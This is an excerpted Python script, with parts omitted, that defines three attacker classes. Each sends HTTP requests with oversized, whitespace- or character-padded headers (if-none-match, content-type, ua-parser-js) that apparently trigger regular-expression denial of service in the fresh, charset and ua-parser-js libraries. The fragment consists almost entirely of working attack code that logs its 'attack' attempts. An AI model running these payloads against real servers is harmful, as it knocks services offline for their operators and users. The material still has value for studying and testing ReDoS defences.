...
class AttackerFresh:
    ...
    def request_http(self, url, length):
        ...
        try:
            ...
            r = requests.get(url, headers = {'if-none-match': 'x' + ' ' * temp_length + 'x', 'X-Server': '192.168.31.38'}, timeout=0.1)
...
class AttackerCharset:
    ...
    def request_http(self, url, length):
        ...
        try:
            r = requests.get(url, headers = {'content-type': 'encoding=' + ' ' * length, 'X-Server': '192.168.31.38'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)
...
class AttackerParser:
    ...
    def request_http(self, url, length):
        ...
        try:
            r = requests.get(url, headers = {'ua-parser-js': 'iphone ios ' + 'a' * length, 'X-Server': '192.168.31.38'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)
